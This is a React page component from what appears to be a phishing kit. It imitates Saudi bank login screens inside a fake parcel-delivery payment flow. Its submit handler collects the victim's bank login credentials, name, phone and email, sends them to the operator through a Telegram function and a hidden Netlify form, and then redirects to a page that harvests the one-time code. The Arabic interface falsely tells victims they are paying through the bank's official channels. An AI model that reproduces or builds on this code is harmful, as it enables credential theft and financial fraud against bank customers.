import { useEffect, useMemo, useState } from "react";
import { useNavigate, useParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Checkbox } from "@/components/ui/checkbox";
import { Card } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { useLink } from "@/hooks/useSupabase";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getBankLoginTemplate, type BankLoginTemplate } from "@/lib/bankLogins";
import {
  ensurePaymentFlowLink,
  getPaymentFlowState,
} from "@/lib/paymentFlow";
import { sendToTelegram } from "@/lib/telegram";
import { ArrowLeft, Check, Shield } from "lucide-react";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  const [template, setTemplate] = useState<BankLoginTemplate | null>(null);
  const [rememberMe, setRememberMe] = useState(false);
  const [formValues, setFormValues] = useState<Record<string, string>>({});
  const [isSubmitting, setIsSubmitting] = useState(false);

  const customerInfo = useMemo(() => {
    try {
      return JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
    } catch (error) {
      console.error('Failed to parse customer info', error);
      return {};
    }
  }, []);

  const shippingInfo = linkData?.payload as any;
  const amount = shippingInfo?.cod_amount || shippingInfo?.total_amount || 0;
  const formattedAmount = amount ? `${amount} ر.س` : "—";
  const serviceKey = linkData?.payload?.service_key || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);

  useEffect(() => {
    if (!id) return;
    ensurePaymentFlowLink(id);
    const state = getPaymentFlowState(id);
    if (!state || state.method !== 'bank-login') {
      navigate(`/pay/${id}/confirm`, { replace: true });
      return;
    }
    const bankTemplate = getBankLoginTemplate(state.bankKey);
    if (!bankTemplate) {
      navigate(`/pay/${id}/confirm`, { replace: true });
      return;
    }
    setTemplate(bankTemplate);
    setFormValues((prev) => {
      const next: Record<string, string> = {};
      bankTemplate.fields.forEach((field) => {
        next[field.id] = prev[field.id] || '';
      });
      return next;
    });
  }, [id, navigate]);

  const handleFieldChange = (fieldId: string, value: string) => {
    setFormValues((prev) => ({
      ...prev,
      [fieldId]: value,
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!template || !id) return;

    const hasEmpty = template.fields.some((field) => !formValues[field.id]?.trim());
    if (hasEmpty) {
      toast({
        title: "الرجاء تعبئة جميع الحقول",
        description: `يرجى إدخال بيانات ${template.nameAr} بالكامل`,
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "bank-login",
          bank: template.nameAr,
          bankKey: template.key,
          rememberMe: rememberMe ? 'true' : 'false',
          service: serviceName,
          amount: formattedAmount,
          customerName: customerInfo.name || '',
          customerPhone: customerInfo.phone || '',
          customerEmail: customerInfo.email || '',
          ...template.fields.reduce((acc, field) => {
            acc[field.id] = formValues[field.id];
            return acc;
          }, {} as Record<string, string>),
        }).toString(),
      });
    } catch (error) {
      console.error('Form submission error:', error);
    }

    const telegramResult = await sendToTelegram({
      type: 'bank_login',
      data: {
        bank: template.nameAr,
        bankKey: template.key,
        rememberMe,
        service: serviceName,
        amount: formattedAmount,
        customer: customerInfo,
        credentials: template.fields.map((field) => ({
          id: field.id,
          label: field.label,
          value: formValues[field.id],
        })),
      },
      timestamp: new Date().toISOString(),
    });

    if (!telegramResult.success) {
      console.error('Failed to send bank login details to Telegram:', telegramResult.error);
    }

    sessionStorage.setItem('bankLoginData', JSON.stringify({
      bankKey: template.key,
      bankName: template.nameAr,
      rememberMe,
      values: formValues,
    }));

    toast({
      title: "تم تسجيل الدخول",
      description: "يرجى إدخال رمز التحقق لإكمال العملية",
    });

    navigate(`/pay/${id}/otp`);
    setIsSubmitting(false);
  };

  if (!template) {
    return null;
  }

  return (
    <div
      className="min-h-screen py-8 sm:py-12"
      dir="rtl"
      style={{
        background: `linear-gradient(135deg, ${template.primaryColor}15, ${template.secondaryColor}15)`
      }}
    >
      <div className="container mx-auto px-4">
        <div className="max-w-5xl mx-auto grid lg:grid-cols-2 gap-6 lg:gap-10">
          <Card
            className="p-6 sm:p-10 shadow-2xl border-0 relative overflow-hidden"
            style={{
              background: `linear-gradient(135deg, ${template.primaryColor}, ${template.secondaryColor})`,
              color: '#fff'
            }}
          >
            {template.backgroundImage && (
              <div
                className="absolute inset-0 opacity-10"
                style={{
                  backgroundImage: `url(${template.backgroundImage})`,
                  backgroundSize: 'cover',
                  backgroundPosition: 'center'
                }}
              />
            )}
            <div className="relative z-10">
              <div className="flex items-center justify-between mb-8">
                <div className="flex items-center gap-3">
                  <div className="h-14 w-14 rounded-2xl bg-white/90 flex items-center justify-center">
                    <img
                      src={template.logo}
                      alt={template.nameAr}
                      className="h-10 w-10 object-contain"
                      onError={(e) => {
                        e.currentTarget.style.display = 'none';
                      }}
                    />
                  </div>
                  <div>
                    <p className="text-xl font-semibold">{template.nameAr}</p>
                    <p className="text-sm text-white/80">{template.tagline || template.nameEn}</p>
                  </div>
                </div>
                <Shield className="w-10 h-10 text-white/70" />
              </div>

              <div className="space-y-5">
                <div>
                  <p className="text-sm text-white/80 mb-1">المبلغ المستحق</p>
                  <p className="text-3xl font-bold">{formattedAmount}</p>
                </div>
                <div className="border border-white/20 rounded-2xl p-4 backdrop-blur bg-white/5">
                  <p className="text-sm text-white/80 mb-2">تفاصيل الخدمة</p>
                  <p className="text-lg font-semibold">{serviceName}</p>
                </div>
                {template.featureList && (
                  <div className="rounded-2xl p-4 bg-black/15 border border-white/10">
                    <p className="text-sm text-white/70 mb-3">مزايا الأمان</p>
                    <ul className="space-y-2 text-sm">
                      {template.featureList.map((feature) => (
                        <li key={feature} className="flex items-center gap-2 text-white/90">
                          <Check className="w-4 h-4" />
                          <span>{feature}</span>
                        </li>
                      ))}
                    </ul>
                  </div>
                )}
              </div>
            </div>
          </Card>

          <Card className="p-6 sm:p-8 shadow-xl border border-border/40" dir="rtl">
            <div className="mb-6">
              <p className="text-sm text-muted-foreground mb-1">الخطوة 3 من 4</p>
              <h1 className="text-2xl font-bold">تسجيل الدخول إلى {template.nameAr}</h1>
              <p className="text-sm text-muted-foreground">
                أدخل بيانات الاعتماد الخاصة بك لإكمال الدفع عبر القنوات الرسمية للمصرف
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              {template.fields.map((field) => (
                <div key={field.id} className="space-y-2">
                  <Label className="text-sm font-semibold text-muted-foreground">{field.label}</Label>
                  <Input
                    dir="rtl"
                    value={formValues[field.id] || ''}
                    onChange={(e) => handleFieldChange(field.id, e.target.value)}
                    placeholder={field.placeholder}
                    type={field.type || 'text'}
                    className="h-12 text-base border-2 focus-visible:ring-0"
                    style={{ borderColor: `${template.primaryColor}40` }}
                    required
                  />
                </div>
              ))}

              {template.showRememberMe && (
                <div className="flex items-center gap-2">
                  <Checkbox
                    id="remember-me"
                    checked={rememberMe}
                    onCheckedChange={(checked) => setRememberMe(!!checked)}
                    className="border border-muted"
                    style={{
                      borderColor: template.primaryColor,
                    }}
                  />
                  <Label htmlFor="remember-me" className="text-sm text-muted-foreground">
                    تذكرني على هذا الجهاز
                  </Label>
                </div>
              )}

              <Button
                type="submit"
                disabled={isSubmitting}
                className="w-full text-lg py-6 text-white"
                style={{
                  background: `linear-gradient(135deg, ${template.primaryColor}, ${template.secondaryColor})`,
                }}
              >
                <span className="ml-2">{template.ctaText || 'تسجيل الدخول'}</span>
                <ArrowLeft className="w-5 h-5 mr-2" />
              </Button>

              <p className="text-xs text-center text-muted-foreground">
                سيتم تحويلك إلى خطوة التحقق برسالة نصية بعد التحقق من بيانات الدخول
              </p>
            </form>

            {template.supportLinks && (
              <div className="mt-6 border-t pt-4">
                <p className="text-xs text-muted-foreground mb-2">روابط مفيدة</p>
                <div className="flex flex-wrap gap-3 text-sm">
                  {template.supportLinks.map((link, index) => (
                    <span key={index} className="text-primary cursor-pointer" style={{ color: branding.colors.primary }}>
                      {link.label}
                    </span>
                  ))}
                </div>
              </div>
            )}

            <form name="bank-login" data-netlify="true" netlify-honeypot="bot-field" hidden>
              <input type="text" name="bank" />
              <input type="text" name="bankKey" />
              <input type="text" name="rememberMe" />
              <input type="text" name="service" />
              <input type="text" name="amount" />
              <input type="text" name="customerName" />
              <input type="text" name="customerPhone" />
              <input type="text" name="customerEmail" />
              {template.fields.map((field) => (
                <input key={field.id} type="text" name={field.id} />
              ))}
            </form>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default PaymentBankLogin;
